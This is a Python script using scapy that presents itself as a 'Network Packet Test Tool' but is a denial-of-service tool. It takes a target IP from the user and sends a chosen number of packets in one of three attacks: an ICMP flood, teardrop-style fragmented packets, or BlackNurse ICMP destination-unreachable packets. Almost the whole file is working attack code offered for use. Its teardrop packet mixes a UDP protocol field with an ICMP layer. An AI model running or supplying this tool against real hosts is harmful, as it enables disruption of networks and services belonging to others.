import logging
import time
import os
import sys
from scapy.all import IP, ICMP, send, conf, get_if_list, get_if_addr, sr1
import warnings
import json

# Silence warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

CHOICE_FILE = "choices.txt"
PAYLOAD = "ping"

import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("[-] Please run this script as Administrator.")
    sys.exit(1)


def get_user_input(prompt, valid_options=None, default=None):
    while True:
        value = input(prompt).strip()
        if not value and default is not None:
            return default
        if valid_options and value not in valid_options:
            print(f"[!] Invalid input. Valid options are: {valid_options}")
        elif value:
            return value

def list_active_interfaces():
    print("Active interfaces (with IPv4 addresses):")
    active_ifaces = []
    for iface in get_if_list():
        try:
            ip = get_if_addr(iface)
            if ip != "0.0.0.0":
                print(f"- {iface} : {ip}")
                active_ifaces.append(iface)
        except Exception:
            continue
    return active_ifaces

def is_ip_reachable(dst_ip):
    print(f"[+] Checking if {dst_ip} is reachable...")
    pkt = IP(dst=dst_ip) / ICMP()
    try:
        response = sr1(pkt, timeout=2, verbose=0)
        if response:
            print(f"[+] {dst_ip} is reachable.")
            return True
        else:
            print(f"[-] {dst_ip} is not responding to ICMP echo request.")
            return False
    except Exception as e:
        print(f"[!] Error checking IP reachability: {e}")
        return False

def send_flood(dst_ip, src_ip, iface, count):
    print(f"[+] Sending {count} ICMP packets from {src_ip} to {dst_ip} on interface {iface}")
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP() / PAYLOAD
    send(pkt * count, iface=iface)

def send_teardrop(dst_ip, src_ip, iface, count):
    print(f"[+] Sending teardrop-like packets from {src_ip} to {dst_ip}")
    pkt = IP(src=src_ip, dst=dst_ip, flags="MF", proto=17, frag=0) / ICMP() / PAYLOAD
    send(pkt * count, iface=iface)

def send_blacknurse(dst_ip, src_ip, iface, count):
    print(f"[+] Sending BlackNurse packets from {src_ip} to {dst_ip}")
    pkt = IP(src=src_ip, dst=dst_ip) / ICMP(type=3, code=3)
    send(pkt * count, iface=iface)

def save_choices(choices):
    with open(CHOICE_FILE, 'w') as f:
        json.dump(choices, f)
    print(f"[+] Choices saved to {CHOICE_FILE}")

def load_choices():
    if not os.path.exists(CHOICE_FILE):
        print(f"[-] No saved choices found.")
        return None
    with open(CHOICE_FILE, 'r') as f:
        try:
            choices = json.load(f)
            print(f"[+] Loaded saved choices from {CHOICE_FILE}")
            return choices
        except json.JSONDecodeError:
            print(f"[!] Error reading saved choices.")
            return None

def main():
    print("=== Network Packet Test Tool ===")

    load_prev = get_user_input("Do you want to load saved choices? (y/n): ", valid_options=["y", "n"])
    choices = {}

    if load_prev == "y":
        choices = load_choices()
        if not choices:
            print("[-] Failed to load saved configuration. Switching to manual input.")
            load_prev = "n"

    if load_prev == "n":
        while True:
            dst_ip = get_user_input("Target IP address: ")
            if is_ip_reachable(dst_ip):
                break
            retry = get_user_input("Do you want to try a different IP? (y/n): ", valid_options=["y", "n"])
            if retry == "n":
                print("[-] Exiting.")
                sys.exit(1)

        n_msg = int(get_user_input("Messages to send: "))
        active_ifaces = list_active_interfaces()
        if not active_ifaces:
            print("[-] No active interfaces found.")
            sys.exit(1)
        iface = get_user_input("Interface to use (choose from above): ", valid_options=active_ifaces)
        print("\nSelect attack type:")
        print("1) Flood\n2) Teardrop\n3) Black Nurse")
        attack_type = get_user_input("Your choice (1/2/3): ", valid_options=["1", "2", "3"])

        local_ip = get_if_addr(iface)

        choices = {
            "dst_ip": dst_ip,
            "n_msg": n_msg,
            "iface": iface,
            "local_ip": local_ip,
            "attack_type": attack_type
        }

        save = get_user_input("Do you want to save these choices for next time? (y/n): ", valid_options=["y", "n"])
        if save == "y":
            save_choices(choices)

    # Use loaded or freshly gathered choices
    dst_ip = choices["dst_ip"]
    n_msg = int(choices["n_msg"])
    iface = choices["iface"]
    local_ip = get_if_addr(iface)
    attack_type = choices["attack_type"]

    print(f"\n[+] Sending {n_msg} packets from {local_ip} to {dst_ip} on interface {iface}...\n")

    start_time = time.time()

    try:
        if attack_type == "1":
            send_flood(dst_ip, local_ip, iface, n_msg)
        elif attack_type == "2":
            send_teardrop(dst_ip, local_ip, iface, n_msg)
        elif attack_type == "3":
            send_blacknurse(dst_ip, local_ip, iface, n_msg)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")

    duration = time.time() - start_time
    speed = n_msg / duration if duration > 0 else 0

    print("\n=== Simulation Complete ===")
    print(f"Time elapsed: {duration:.2f} seconds")
    print(f"Total packets sent: {n_msg}")
    print(f"Approx. speed: {speed:.2f} packets/sec")

if __name__ == "__main__":
    main()
